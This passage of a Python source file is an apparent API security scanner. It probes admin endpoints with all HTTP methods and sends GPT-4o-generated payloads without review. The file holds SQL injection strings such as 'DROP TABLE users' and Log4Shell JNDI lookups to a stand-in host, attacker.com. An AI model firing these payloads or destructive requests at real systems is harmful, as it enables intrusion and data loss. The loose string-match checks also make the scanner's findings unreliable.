#!/usr/bin/env python3

import requests
import json
import time
import logging
import re
from typing import List, Dict, Any, Optional, Set, Tuple
from urllib.parse import urljoin, urlparse, parse_qs
import concurrent.futures
from dataclasses import dataclass
from enum import Enum
import itertools
from collections import defaultdict
import openai
import os
import sys
from datetime import datetime
from common import (
    VulnerabilityType,
    Vulnerability,
    EndpointInfo,
    progress,
    logger
)
from advanced_security_tests import AdvancedSecurityTests

# Configure detailed logging
log_dir = "logs"
os.makedirs(log_dir, exist_ok=True)
timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
log_file = os.path.join(log_dir, f"security_scan_{timestamp}.log")

# Configure logging to both file and console
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(log_file),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

# Add a progress logger for step-by-step tracking
class ProgressLogger:
    def __init__(self):
        self.step_count = 0
        self.current_phase = ""
        
    def start_phase(self, phase_name: str):
        self.current_phase = phase_name
        self.step_count = 0
        logger.info(f"\n{'='*80}")
        logger.info(f"STARTING PHASE: {phase_name}")
        logger.info(f"{'='*80}\n")
        
    def log_step(self, step_description: str, details: Optional[Dict[str, Any]] = None):
        self.step_count += 1
        logger.info(f"[{self.current_phase} - Step {self.step_count}] {step_description}")
        if details:
            logger.info(f"Details: {json.dumps(details, indent=2)}")
            
    def end_phase(self, summary: Optional[str] = None):
        logger.info(f"\n{'-'*80}")
        logger.info(f"COMPLETED PHASE: {self.current_phase} - {self.step_count} steps")
        if summary:
            logger.info(f"Summary: {summary}")
        logger.info(f"{'-'*80}\n")

# Global progress logger
progress = ProgressLogger()

class AIModel:
    def __init__(self):
        # Initialize OpenAI client
        self.openai_client = openai.OpenAI()  # Requires OPENAI_API_KEY environment variable
        
        # Cache for responses
        self.response_cache = {}
        
        progress.log_step("Initialized AI model", {"model": "gpt-4o"})
        
    def analyze_response(self, text: str) -> Dict[str, Any]:
        """Analyze API response using GPT-4o."""
        progress.log_step("Analyzing API response with AI", {"text_length": len(text)})
        
        cache_key = hash(text[:1000])  # Cache based on first 1000 chars
        if cache_key in self.response_cache:
            progress.log_step("Using cached AI analysis result")
            return self.response_cache[cache_key]
            
        prompt = f"""
        Analyze this API response for security implications:
        {text[:1000]}
        
        Provide a JSON response with:
        1. content_type: The type of content (JSON, XML, HTML, etc.)
        2. security_indicators: List of security-related patterns found
        3. risk_level: LOW, MEDIUM, or HIGH
        4. potential_vulnerabilities: List of potential vulnerabilities
        """
        
        try:
            progress.log_step("Sending request to GPT-4o")
            response = self.openai_client.chat.completions.create(
                model="gpt-4o",
                messages=[
                    {"role": "system", "content": "You are a security expert analyzing API responses. Respond only with valid JSON."},
                    {"role": "user", "content": prompt}
                ],
                response_format={ "type": "json_object" }
            )
            analysis = json.loads(response.choices[0].message.content)
            self.response_cache[cache_key] = analysis
            progress.log_step("Received AI analysis", {"risk_level": analysis.get("risk_level", "UNKNOWN")})
            return analysis
        except Exception as e:
            logger.error(f"Error in AI response analysis: {str(e)}")
            return {}
    
    def compare_responses(self, text1: str, text2: str) -> float:
        """Compare two responses for similarity using GPT-4o."""
        prompt = f"""
        Compare these two API responses for similarity:
        Response 1: {text1[:500]}
        Response 2: {text2[:500]}
        
        Return a JSON object with:
        1. similarity_score: A number between 0 and 1
        2. matching_patterns: List of patterns that match between responses
        3. security_implications: Any security implications of the similarity
        """
        
        try:
            response = self.openai_client.chat.completions.create(
                model="gpt-4o",
                messages=[
                    {"role": "system", "content": "You are a security expert comparing API responses. Respond only with valid JSON."},
                    {"role": "user", "content": prompt}
                ],
                response_format={ "type": "json_object" }
            )
            result = json.loads(response.choices[0].message.content)
            return float(result.get('similarity_score', 0.0))
        except Exception as e:
            logger.error(f"Error in AI response comparison: {str(e)}")
            return 0.0
    
    def analyze_vulnerability(self, endpoint: str, response: str, context: Dict[str, Any]) -> Dict[str, Any]:
        """Use GPT-4o to analyze potential vulnerabilities."""
        prompt = f"""
        Analyze this API endpoint for security vulnerabilities:
        Endpoint: {endpoint}
        Response: {response[:1000]}
        Context: {json.dumps(context, indent=2)}
        
        Return a JSON object with:
        1. vulnerabilities: List of found vulnerabilities with:
           - type: OWASP category
           - severity: HIGH, MEDIUM, or LOW
           - description: Detailed description
           - evidence: Supporting evidence
        2. suggested_tests: List of additional tests to perform
        3. risk_assessment: Overall risk assessment
        4. mitigation_suggestions: List of security improvements
        5. impact_analysis: Detailed analysis of potential impact
        6. recommendations: Specific recommendations to fix issues
        7. key_findings: Key security findings
        8. priority_recommendations: Prioritized list of recommendations
        9. next_steps: Suggested next steps for remediation
        """
        
        try:
            response = self.openai_client.chat.completions.create(
                model="gpt-4o",
                messages=[
                    {"role": "system", "content": "You are a security expert analyzing API endpoints for vulnerabilities. Respond only with valid JSON."},
                    {"role": "user", "content": prompt}
                ],
                response_format={ "type": "json_object" }
            )
            return json.loads(response.choices[0].message.content)
        except Exception as e:
            logger.error(f"Error in AI vulnerability analysis: {str(e)}")
            return {}

    def suggest_next_tests(self, endpoint: str, findings: List[Dict[str, Any]], context: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Use GPT-4o to suggest next security tests."""
        prompt = f"""
        Based on these findings, suggest the next security tests to perform:
        Endpoint: {endpoint}
        Current Findings: {json.dumps(findings, indent=2)}
        Context: {json.dumps(context, indent=2)}
        
        Return a JSON object with:
        1. suggested_tests: List of tests with:
           - endpoint: The endpoint to test
           - method: HTTP method to use
           - payload: Test payload
           - reason: Why this test is suggested
        2. priority: HIGH, MEDIUM, or LOW
        3. expected_outcome: What to look for
        """
        
        try:
            response = self.openai_client.chat.completions.create(
                model="gpt-4o",
                messages=[
                    {"role": "system", "content": "You are a security expert suggesting API security tests. Respond only with valid JSON."},
                    {"role": "user", "content": prompt}
                ],
                response_format={ "type": "json_object" }
            )
            return json.loads(response.choices[0].message.content)
        except Exception as e:
            logger.error(f"Error in AI test suggestions: {str(e)}")
            return {"suggested_tests": []}

    def generate_test_cases(self, endpoint: str, method: str, context: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Use GPT-4o to generate test cases for a specific endpoint."""
        progress.log_step(f"Generating test cases for {endpoint}", {"method": method})
        
        prompt = f"""
        Generate comprehensive security test cases for this API endpoint:
        Endpoint: {endpoint}
        Method: {method}
        Context: {json.dumps(context, indent=2)}
        
        Return a JSON object with:
        1. test_cases: List of test cases with:
           - name: Test case name
           - description: What this test is checking
           - vulnerability_type: OWASP category being tested
           - payload: The test payload to send
           - expected_response: What to look for in the response
           - severity: HIGH, MEDIUM, or LOW
           - success_criteria: How to determine if the test found a vulnerability
        2. test_categories: List of vulnerability categories being tested
        """
        
        try:
            response = self.openai_client.chat.completions.create(
                model="gpt-4o",
                messages=[
                    {"role": "system", "content": "You are a security expert generating API security test cases. Respond only with valid JSON."},
                    {"role": "user", "content": prompt}
                ],
                response_format={ "type": "json_object" }
            )
            result = json.loads(response.choices[0].message.content)
            progress.log_step(f"Generated {len(result.get('test_cases', []))} test cases", {
                "categories": result.get('test_categories', [])
            })
            return result
        except Exception as e:
            logger.error(f"Error generating test cases: {str(e)}")
            return {"test_cases": []}
            
    def analyze_parameter(self, endpoint: str, parameter: str, value: str, context: Dict[str, Any]) -> Dict[str, Any]:
        """Use GPT-4o to analyze a specific parameter for vulnerabilities."""
        prompt = f"""
        Analyze this API parameter for security vulnerabilities:
        Endpoint: {endpoint}
        Parameter: {parameter}
        Value: {value}
        Context: {json.dumps(context, indent=2)}
        
        Return a JSON object with:
        1. vulnerabilities: List of potential vulnerabilities with:
           - type: Vulnerability type
           - description: Detailed description
           - severity: HIGH, MEDIUM, or LOW
           - evidence: Supporting evidence
        2. test_payloads: List of test payloads to try
        3. recommendations: How to secure this parameter
        """
        
        try:
            response = self.openai_client.chat.completions.create(
                model="gpt-4o",
                messages=[
                    {"role": "system", "content": "You are a security expert analyzing API parameters. Respond only with valid JSON."},
                    {"role": "user", "content": prompt}
                ],
                response_format={ "type": "json_object" }
            )
            return json.loads(response.choices[0].message.content)
        except Exception as e:
            logger.error(f"Error analyzing parameter: {str(e)}")
            return {}

class ChainOfThought:
    def __init__(self):
        self.thoughts: List[str] = []
        self.endpoint_patterns: Dict[str, List[str]] = defaultdict(list)
        self.parameter_patterns: Dict[str, List[str]] = defaultdict(list)
        self.auth_patterns: List[str] = []
        self.tech_stack: Set[str] = set()
        self.ai_model = AIModel()
        self.response_analysis: Dict[str, Dict[str, Any]] = {}

    def add_thought(self, thought: str):
        self.thoughts.append(thought)
        logger.info(f"Chain of Thought: {thought}")

    def analyze_endpoint(self, endpoint: str, response: requests.Response) -> None:
        """Analyze endpoint response using AI models."""
        # Analyze admin endpoint patterns
        if endpoint.startswith('/v1/admin/'):
            service = endpoint.split('/')[-1]  # Get the service name (e.g., 'routes', 'providers')
            self.endpoint_patterns[f'/v1/admin/{service}'].append(endpoint)
            self.add_thought(f"Analyzing admin service endpoint: {service}")

        # AI-powered analysis
        response_text = response.text
        analysis = self.ai_model.analyze_response(response_text)
        self.response_analysis[endpoint] = analysis
        
        # Analyze technology stack from headers
        tech_indicators = {
            'Server': 'Web Server',
            'X-Powered-By': 'Application Framework',
            'X-Runtime': 'Runtime Environment',
            'X-Framework': 'Web Framework',
            'X-Application-Context': 'Application Context',
            'X-Request-ID': 'Request Tracking',
            'X-Correlation-ID': 'Request Correlation',
            'X-Content-Type-Options': 'Security Headers',
            'X-Frame-Options': 'Security Headers',
            'X-XSS-Protection': 'Security Headers',
            'Strict-Transport-Security': 'Security Headers'
        }
        
        for header, category in tech_indicators.items():
            if header in response.headers:
                tech = f"{category}: {response.headers[header]}"
                self.tech_stack.add(tech)
                self.add_thought(f"Identified {tech}")
                
                # Use AI to analyze tech stack security implications
                tech_analysis = self.ai_model.analyze_vulnerability(
                    endpoint,
                    f"Technology: {tech}",
                    {"headers": dict(response.headers)}
                )
                if tech_analysis.get('vulnerabilities'):
                    self.add_thought(f"AI identified potential tech stack vulnerabilities: {tech_analysis['vulnerabilities']}")

        # Analyze authentication
        if response.status_code == 401:
            self.auth_patterns.append(endpoint)
            self.add_thought(f"Endpoint requires authentication: {endpoint}")
            
            # Use AI to analyze auth mechanism
            auth_analysis = self.ai_model.analyze_vulnerability(
                endpoint,
                response_text,
                {"status_code": response.status_code, "headers": dict(response.headers)}
            )
            if auth_analysis.get('vulnerabilities'):
                self.add_thought(f"AI identified potential auth vulnerabilities: {auth_analysis['vulnerabilities']}")
                
        # Analyze response content type and structure
        content_type = response.headers.get('Content-Type', '')
        if 'application/json' in content_type:
            try:
                data = response.json()
                if isinstance(data, dict):
                    self.add_thought(f"Endpoint returns JSON object with keys: {list(data.keys())}")
                elif isinstance(data, list):
                    self.add_thought(f"Endpoint returns JSON array with {len(data)} items")
            except json.JSONDecodeError:
                self.add_thought("Endpoint returns invalid JSON")
        elif 'application/xml' in content_type:
            self.add_thought("Endpoint returns XML data")
        elif 'text/html' in content_type:
            self.add_thought("Endpoint returns HTML content")
            
        # Analyze response status codes
        if response.status_code == 200:
            self.add_thought("Endpoint accessible and returns successful response")
        elif response.status_code == 403:
            self.add_thought("Endpoint requires specific permissions")
        elif response.status_code == 404:
            self.add_thought("Endpoint not found")
        elif response.status_code >= 500:
            self.add_thought(f"Endpoint returned server error: {response.status_code}")

    def suggest_next_tests(self, endpoint: str, current_findings: List[Vulnerability]) -> List[Tuple[str, str]]:
        """Suggest next tests using AI analysis."""
        suggestions = []
        
        # Get AI analysis for current endpoint
        current_analysis = self.response_analysis.get(endpoint, {})
        
        # If we found injection vulnerabilities, try related endpoints
        if any(v.type == VulnerabilityType.INJECTION for v in current_findings):
            pattern = '/'.join(endpoint.split('/')[:-1]) + '/{id}'
            if pattern in self.endpoint_patterns:
                for related in self.endpoint_patterns[pattern]:
                    # Compare responses using AI
                    if endpoint in self.response_analysis and related in self.response_analysis:
                        similarity = self.ai_model.compare_responses(
                            str(self.response_analysis[endpoint]),
                            str(self.response_analysis[related])
                        )
                        if similarity > 0.8:  # High similarity threshold
                            suggestions.append((related, f"Testing related endpoint (similarity: {similarity:.2f})"))

        # Use AI to analyze and suggest tests
        if current_analysis:
            progress.log_step("Getting AI suggestions for next tests", {
                "endpoint": endpoint,
                "current_findings": len(current_findings)
            })
            
            ai_suggestions = self.ai_model.analyze_vulnerability(
                endpoint,
                str(current_analysis),
                {"findings": [v.__dict__ for v in current_findings]}
            )
            
            if ai_suggestions and 'suggested_tests' in ai_suggestions:
                for test in ai_suggestions['suggested_tests']:
                    if isinstance(test, dict) and 'endpoint' in test and 'reason' in test:
                        suggestions.append((test['endpoint'], test['reason']))
                    elif isinstance(test, str):
                        # Handle case where test is just a string (endpoint)
                        suggestions.append((test, "AI suggested endpoint to test"))
            
            progress.log_step("Received AI suggestions", {
                "num_suggestions": len(suggestions)
            })

        return suggestions

class EndpointDiscovery:
    def __init__(self, base_url: str, headers: Optional[Dict[str, str]] = None):
        self.base_url = base_url.rstrip('/')
        self.headers = headers or {}
        self.session = requests.Session()
        self.session.headers.update(self.headers)
        self.discovered_endpoints: Set[str] = set()
        
        # Specific endpoints to test
        self.target_endpoints = [
            '/v1/admin/routes',
            '/v1/admin/providers',
            '/v1/admin/account',
            '/v1/admin/alerts',
            '/v1/admin/application',
            '/v1/admin/archives',
            '/v1/admin/audit',
            '/v1/admin/dashboards',
            '/v1/admin/dataprotection',
            '/v1/admin/eval',
            '/v1/admin/events',
            '/v1/admin/gateway',
            '/v1/admin/goff',
            '/v1/admin/guardrails',
            '/v1/admin/keyvault',
            '/v1/admin/healthz',
            '/v1/admin/logs',
            '/v1/admin/metrics',
            '/v1/admin/modelspec',
            '/v1/admin/threat',
            '/v1/admin/traces',
            '/v1/admin/trace',
            '/v1/admin/usage'
        ]
        
        # Common HTTP methods to try
        self.http_methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS']
        
        progress.log_step("Initialized endpoint discovery", {
            "base_url": self.base_url,
            "target_endpoints": len(self.target_endpoints),
            "http_methods": self.http_methods
        })

    def discover_endpoints(self) -> Set[str]:
        """Test the specified endpoints."""
        progress.start_phase("Endpoint Testing")
        progress.log_step(f"Starting testing of {len(self.target_endpoints)} specified endpoints")
        
        for endpoint in self.target_endpoints:
            progress.log_step(f"Testing endpoint: {endpoint}")
            self._try_endpoint(endpoint)
        
        progress.end_phase(f"Tested {len(self.target_endpoints)} endpoints, discovered {len(self.discovered_endpoints)} valid endpoints")
        return self.discovered_endpoints

    def _try_endpoint(self, path: str) -> None:
        """Try different HTTP methods on an endpoint."""
        progress.log_step(f"Testing endpoint: {path}")
        
        for method in self.http_methods:
            try:
                url = urljoin(self.base_url, path)
                progress.log_step(f"Testing {method} {url}")
                
                response = self.session.request(method, url)
                
                # Log response details
                progress.log_step(f"Response for {method} {path}", {
                    "status_code": response.status_code,
                    "content_type": response.headers.get('Content-Type', 'unknown'),
                    "content_length": len(response.text)
                })
                
                # If we get any response other than 404, consider it a valid endpoint
                if response.status_code != 404:
                    self.discovered_endpoints.add(path)
                    progress.log_step(f"Discovered valid endpoint: {path} ({method})", {
                        "status_code": response.status_code,
                        "headers": dict(response.headers)
                    })
            except Exception as e:
                logger.error(f"Error trying {method} {path}: {str(e)}")
                progress.log_step(f"Error testing {method} {path}", {"error": str(e)})

class SecurityAgent:
    def __init__(self, base_url: str, headers: Optional[Dict[str, str]] = None):
        progress.start_phase("Security Agent Initialization")
        
        self.base_url = base_url.rstrip('/')
        self.headers = headers or {}
        self.vulnerabilities: List[Vulnerability] = []
        self.session = requests.Session()
        self.session.headers.update(self.headers)
        
        progress.log_step("Initializing components", {
            "base_url": self.base_url,
            "headers": self.headers
        })
        
        self.discovery = EndpointDiscovery(base_url, headers)
        self.chain_of_thought = ChainOfThought()
        self.endpoint_info: Dict[str, EndpointInfo] = {}
        self.advanced_tests = AdvancedSecurityTests(self.chain_of_thought.ai_model)
        
        progress.end_phase("Security Agent initialized")

    def discover_and_test(self) -> List[Vulnerability]:
        """Discover endpoints and test them using chain of thought approach."""
        progress.start_phase("Security Testing")
        
        # First discover endpoints
        progress.log_step("Starting endpoint discovery")
        endpoints = self.discovery.discover_endpoints()
        progress.log_step(f"Discovered {len(endpoints)} initial endpoints", {"endpoints": list(endpoints)})
        
        # Build endpoint information
        progress.log_step("Gathering detailed endpoint information")
        for endpoint in endpoints:
            self._gather_endpoint_info(endpoint)
        
        # Test endpoints with chain of thought
        progress.log_step("Starting vulnerability testing with chain of thought")
        vulnerabilities = self._test_with_chain_of_thought(endpoints)
        
        progress.end_phase(f"Found {len(vulnerabilities)} vulnerabilities")
        return vulnerabilities

    def _gather_endpoint_info(self, endpoint: str) -> None:
        """Gather detailed information about an endpoint."""
        progress.log_step(f"Gathering information for endpoint: {endpoint}")
        
        methods = set()
        parameters = defaultdict(list)
        response_codes = defaultdict(int)
        content_types = set()
        requires_auth = False

        for method in ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS']:
            try:
                progress.log_step(f"Testing {method} method on {endpoint}")
                response = self.session.request(method, urljoin(self.base_url, endpoint))
                methods.add(method)
                response_codes[method] = response.status_code
                
                if 'Content-Type' in response.headers:
                    content_types.add(response.headers['Content-Type'])
                
                if response.status_code == 401:
                    requires_auth = True
                    progress.log_step(f"Endpoint {endpoint} requires authentication")

                # Analyze response for parameters
                if response.status_code == 200:
                    self.chain_of_thought.analyze_endpoint(endpoint, response)
                    
                    # Look for parameters in response
                    if 'application/json' in response.headers.get('Content-Type', ''):
                        try:
                            data = response.json()
                            self._extract_parameters(data, parameters)
                            progress.log_step(f"Extracted parameters from {endpoint}", {"parameters": list(parameters.keys())})
                        except json.JSONDecodeError:
                            progress.log_step(f"Failed to parse JSON from {endpoint}")

            except Exception as e:
                logger.error(f"Error testing {method} {endpoint}: {str(e)}")

        self.endpoint_info[endpoint] = EndpointInfo(
            path=endpoint,
            methods=methods,
            parameters=dict(parameters),
            response_codes=response_codes,
            content_types=content_types,
            requires_auth=requires_auth,
            discovered_from="initial_scan",
            related_endpoints=set()
        )
        
        progress.log_step(f"Completed information gathering for {endpoint}", {
            "methods": list(methods),
            "content_types": list(content_types),
            "requires_auth": requires_auth
        })

    def _extract_parameters(self, data: Any, parameters: Dict[str, List[str]], prefix: str = '') -> None:
        """Recursively extract parameters from JSON response."""
        if isinstance(data, dict):
            for key, value in data.items():
                param_name = f"{prefix}{key}" if prefix else key
                if isinstance(value, (str, int, float)):
                    parameters[param_name].append(str(value))
                elif isinstance(value, (dict, list)):
                    self._extract_parameters(value, parameters, f"{param_name}.")
        elif isinstance(data, list):
            for item in data:
                self._extract_parameters(item, parameters, prefix)

    def _test_with_chain_of_thought(self, initial_endpoints: Set[str]) -> List[Vulnerability]:
        """Test endpoints using chain of thought approach."""
        progress.start_phase("Vulnerability Testing")
        
        tested_endpoints = set()
        endpoints_to_test = set(initial_endpoints)
        
        progress.log_step(f"Starting testing of {len(endpoints_to_test)} endpoints")
        
        while endpoints_to_test:
            endpoint = endpoints_to_test.pop()
            if endpoint in tested_endpoints:
                continue
                
            progress.log_step(f"Testing endpoint: {endpoint}")
            
            # Test the endpoint
            current_findings = []
            self.test_endpoint(endpoint)
            current_findings = [v for v in self.vulnerabilities if v.endpoint == endpoint]
            
            if current_findings:
                progress.log_step(f"Found {len(current_findings)} vulnerabilities in {endpoint}", {
                    "vulnerabilities": [v.type.value for v in current_findings]
                })
            
            # Get suggestions for next tests
            progress.log_step(f"Getting suggestions for next tests based on {endpoint}")
            suggestions = self.chain_of_thought.suggest_next_tests(endpoint, current_findings)
            for suggested_endpoint, reason in suggestions:
                if suggested_endpoint not in tested_endpoints:
                    endpoints_to_test.add(suggested_endpoint)
                    progress.log_step(f"Adding {suggested_endpoint} to test queue", {"reason": reason})
            
            tested_endpoints.add(endpoint)
        
        progress.end_phase(f"Tested {len(tested_endpoints)} endpoints, found {len(self.vulnerabilities)} vulnerabilities")
        return self.vulnerabilities

    def test_endpoint(self, endpoint: str, method: str = 'GET') -> None:
        """Test a single endpoint for various vulnerabilities."""
        progress.start_phase(f"Testing Endpoint: {endpoint}")
        
        full_url = urljoin(self.base_url, endpoint)
        progress.log_step(f"Testing endpoint: {full_url}")
        
        # Get endpoint info
        info = self.endpoint_info.get(endpoint)
        if not info:
            progress.log_step(f"No information found for endpoint: {endpoint}")
            return

        # Prepare context for AI test case generation
        context = {
            "endpoint_info": {
                "path": info.path,
                "methods": list(info.methods),
                "parameters": info.parameters,
                "response_codes": info.response_codes,
                "content_types": list(info.content_types),
                "requires_auth": info.requires_auth,
                "discovered_from": info.discovered_from,
                "related_endpoints": list(info.related_endpoints)
            },
            "current_findings": [v.__dict__ for v in self.vulnerabilities if v.endpoint == endpoint],
            "tech_stack": list(self.chain_of_thought.tech_stack)
        }
        
        # Generate AI-powered test cases
        progress.log_step(f"Generating AI-powered test cases for {endpoint}")
        ai_test_cases = self.chain_of_thought.ai_model.generate_test_cases(endpoint, method, context)
        
        # Run baseline tests
        progress.log_step(f"Running baseline security tests for {endpoint}")
        
        # Test based on discovered information
        if info.requires_auth:
            progress.log_step(f"Testing authentication for {endpoint}")
            self._test_broken_auth(full_url, method)
        
        # Test for common vulnerabilities
        progress.log_step(f"Testing for common vulnerabilities in {endpoint}")
        
        # Test for injection vulnerabilities
        if 'application/json' in info.content_types:
            progress.log_step(f"Testing JSON endpoints for injection and deserialization")
            self._test_injection(full_url, method)
            self._test_insecure_deserialization(full_url, method)
        
        # Test for sensitive data exposure
        progress.log_step(f"Testing for sensitive data exposure in {endpoint}")
        self._test_sensitive_data(full_url, method)
        
        # Test for broken access control
        progress.log_step(f"Testing for broken access control in {endpoint}")
        self._test_broken_access(full_url, method)
        
        # Test for XSS vulnerabilities
        progress.log_step(f"Testing for XSS vulnerabilities in {endpoint}")
        self._test_xss(full_url, method)
        
        # Test for security misconfiguration
        progress.log_step(f"Testing for security misconfiguration in {endpoint}")
        self._test_security_misconfig(full_url, method)
        
        # Test for insufficient logging
        progress.log_step(f"Testing for insufficient logging in {endpoint}")
        self._test_insufficient_logging(full_url, method)
        
        # Run AI-generated test cases
        if ai_test_cases and 'test_cases' in ai_test_cases:
            progress.log_step(f"Running {len(ai_test_cases['test_cases'])} AI-generated test cases")
            
            for test_case in ai_test_cases['test_cases']:
                try:
                    progress.log_step(f"Running test case: {test_case.get('name', 'Unnamed test')}", {
                        "description": test_case.get('description', 'No description'),
                        "vulnerability_type": test_case.get('vulnerability_type', 'Unknown'),
                        "severity": test_case.get('severity', 'Medium')
                    })
                    
                    # Prepare the test payload
                    payload = test_case.get('payload', {})
                    if isinstance(payload, str):
                        # If payload is a string, try to parse it as JSON
                        try:
                            payload = json.loads(payload)
                        except json.JSONDecodeError:
                            # If not valid JSON, use as is
                            pass
                    
                    # Send the request with the test payload
                    if method in ['GET', 'HEAD', 'OPTIONS']:
                        response = self.session.request(method, full_url, params=payload)
                    else:
                        response = self.session.request(method, full_url, json=payload)
                    
                    # Check if the test was successful based on success criteria
                    success_criteria = test_case.get('success_criteria', '')
                    expected_response = test_case.get('expected_response', '')
                    
                    # Log the test result
                    progress.log_step(f"Test case result", {
                        "status_code": response.status_code,
                        "content_type": response.headers.get('Content-Type', 'unknown'),
                        "content_length": len(response.text)
                    })
                    
                    # Check if the test found a vulnerability
                    vulnerability_found = False
                    if success_criteria:
                        # If specific success criteria is provided, use it
                        if success_criteria in response.text:
                            vulnerability_found = True
                    elif expected_response:
                        # If expected response is provided, check if it matches
                        if expected_response in response.text:
                            vulnerability_found = True
                    else:
                        # Default checks based on vulnerability type
                        vuln_type = test_case.get('vulnerability_type', '').lower()
                        if 'injection' in vuln_type and any(error in response.text.lower() for error in ['sql', 'syntax', 'error']):
                            vulnerability_found = True
                        elif 'xss' in vuln_type and test_case.get('payload', '') in response.text:
                            vulnerability_found = True
                        elif 'auth' in vuln_type and response.status_code != 401 and response.status_code != 403:
                            vulnerability_found = True
                        elif 'sensitive' in vuln_type and any(pattern in response.text for pattern in ['password', 'token', 'key', 'secret']):
                            vulnerability_found = True
                    
                    if vulnerability_found:
                        # Add the vulnerability to our findings
                        self.vulnerabilities.append(
                            Vulnerability(
                                type=VulnerabilityType(test_case.get('vulnerability_type', 'Security Misconfiguration')),
                                endpoint=endpoint,
                                description=test_case.get('description', 'AI-generated test case found a vulnerability'),
                                severity=test_case.get('severity', 'Medium'),
                                evidence=response.text[:200],
                                chain_of_thought=[
                                    f"AI-generated test case: {test_case.get('name', 'Unnamed test')}",
                                    f"Test description: {test_case.get('description', 'No description')}",
                                    f"Payload used: {json.dumps(payload)[:100]}...",
                                    f"Expected response: {expected_response}",
                                    f"Success criteria: {success_criteria}"
                                ]
                            )
                        )
                        progress.log_step(f"Vulnerability found with AI-generated test case", {
                            "test_name": test_case.get('name', 'Unnamed test'),
                            "vulnerability_type": test_case.get('vulnerability_type', 'Unknown')
                        })
                    
                except Exception as e:
                    logger.error(f"Error running AI-generated test case: {str(e)}")
                    progress.log_step(f"Error in AI test case", {"error": str(e)})
        
        # Test parameters if available
        if info.parameters:
            progress.log_step(f"Testing {len(info.parameters)} parameters for vulnerabilities")
            
            for param_name, param_values in info.parameters.items():
                if param_values:
                    # Use the first value as a sample for analysis
                    sample_value = param_values[0]
                    
                    # Analyze the parameter with AI
                    param_analysis = self.chain_of_thought.ai_model.analyze_parameter(
                        endpoint, 
                        param_name, 
                        sample_value, 
                        context
                    )
                    
                    if param_analysis and 'test_payloads' in param_analysis:
                        progress.log_step(f"Testing parameter: {param_name}", {
                            "sample_value": sample_value,
                            "test_payloads": len(param_analysis['test_payloads'])
                        })
                        
                        for payload in param_analysis['test_payloads']:
                            try:
                                # Prepare the test payload
                                test_params = {param_name: payload}
                                
                                # Send the request with the test payload
                                if method in ['GET', 'HEAD', 'OPTIONS']:
                                    response = self.session.request(method, full_url, params=test_params)
                                else:
                                    response = self.session.request(method, full_url, json=test_params)
                                
                                # Check for vulnerabilities in the response
                                if any(vuln_type in response.text.lower() for vuln_type in ['error', 'exception', 'warning', 'sql', 'syntax']):
                                    # Add the vulnerability to our findings
                                    self.vulnerabilities.append(
                                        Vulnerability(
                                            type=VulnerabilityType.INJECTION,
                                            endpoint=endpoint,
                                            description=f"Parameter '{param_name}' may be vulnerable to injection attacks",
                                            severity="High",
                                            evidence=response.text[:200],
                                            chain_of_thought=[
                                                f"Parameter: {param_name}",
                                                f"Sample value: {sample_value}",
                                                f"Test payload: {payload}",
                                                f"Response contains error indicators"
                                            ]
                                        )
                                    )
                                    progress.log_step(f"Vulnerability found in parameter", {
                                        "parameter": param_name,
                                        "payload": payload
                                    })
                                    
                            except Exception as e:
                                logger.error(f"Error testing parameter {param_name}: {str(e)}")
                                progress.log_step(f"Error testing parameter", {
                                    "parameter": param_name,
                                    "error": str(e)
                                })
        
        # Run advanced security tests
        progress.log_step(f"Running advanced security tests for {endpoint}")
        advanced_vulnerabilities = self.advanced_tests.run_all_tests(full_url, method, self.headers)
        
        # Add advanced vulnerabilities to our findings
        for vuln in advanced_vulnerabilities:
            # Update the endpoint to match our current endpoint
            vuln.endpoint = endpoint
            self.vulnerabilities.append(vuln)
            
        progress.log_step(f"Advanced security testing completed", {
            "vulnerabilities_found": len(advanced_vulnerabilities)
        })
        
        # Add chain of thought to vulnerabilities
        for vuln in self.vulnerabilities:
            if vuln.endpoint == endpoint:
                vuln.chain_of_thought = self.chain_of_thought.thoughts
                
        progress.end_phase(f"Completed testing for {endpoint}")

    def _test_injection(self, url: str, method: str) -> None:
        """Test for SQL injection, NoSQL injection, and command injection."""
        progress.log_step(f"Testing for injection vulnerabilities: {url}")
        
        payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users--",
            "1' OR '1' = '1",
            "1; DROP TABLE users",
            "admin' --",
            "admin' #",
            "admin'/*",
            "${jndi:ldap://attacker.com/a}",
            "${jndi:rmi://attacker.com/a}",
        ]

        for payload in payloads:
            try:
                progress.log_step(f"Testing injection payload: {payload}")
                params = {'id': payload, 'search': payload}
                response = self.session.request(method, url, params=params)
                
                # Check for error messages or unexpected behavior
                if any(error in response.text.lower() for error in ['sql', 'mysql', 'postgresql', 'oracle', 'syntax']):
                    progress.log_step(f"Injection vulnerability found with payload: {payload}")
                    self.vulnerabilities.append(
                        Vulnerability(
                            type=VulnerabilityType.INJECTION,
                            endpoint=url,
                            description=f"Potential SQL/NoSQL injection vulnerability detected with payload: {payload}",
                            severity="High",
                            evidence=response.text[:200],
                            chain_of_thought=[]
                        )
                    )
            except Exception as e:
                logger.error(f"Error testing injection for {url}: {str(e)}")

    def _test_broken_auth(self, url: str, method: str) -> None:
        """Test for broken authentication vulnerabilities."""
        # Test without authentication
        try:
            response = self.session.request(method, url)
            if response.status_code != 401 and response.status_code != 403:
                self.vulnerabilities.append(
                    Vulnerability(
                        type=VulnerabilityType.BROKEN_AUTH,
                        endpoint=url,
                        description="Endpoint accessible without authentication",
                        severity="High",
                        evidence=f"Status code: {response.status_code}",
                        chain_of_thought=[]
                    )
                )
        except Exception as e:
            logger.error(f"Error testing broken auth for {url}: {str(e)}")

    def _test_sensitive_data(self, url: str, method: str) -> None:
        """Test for sensitive data exposure."""
        progress.log_step(f"Testing for sensitive data exposure: {url}")
        
        try:
            response = self.session.request(method, url)
            
            # Check for sensitive data patterns
            sensitive_patterns = [
                (r'\b\d{16}\b', 'Credit card number'),
                (r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', 'Email address'),
                (r'\b\d{3}-\d{2}-\d{4}\b', 'SSN'),
                (r'password["\']?\s*[:=]\s*["\']?[^"\'\s]+["\']?', 'Password'),
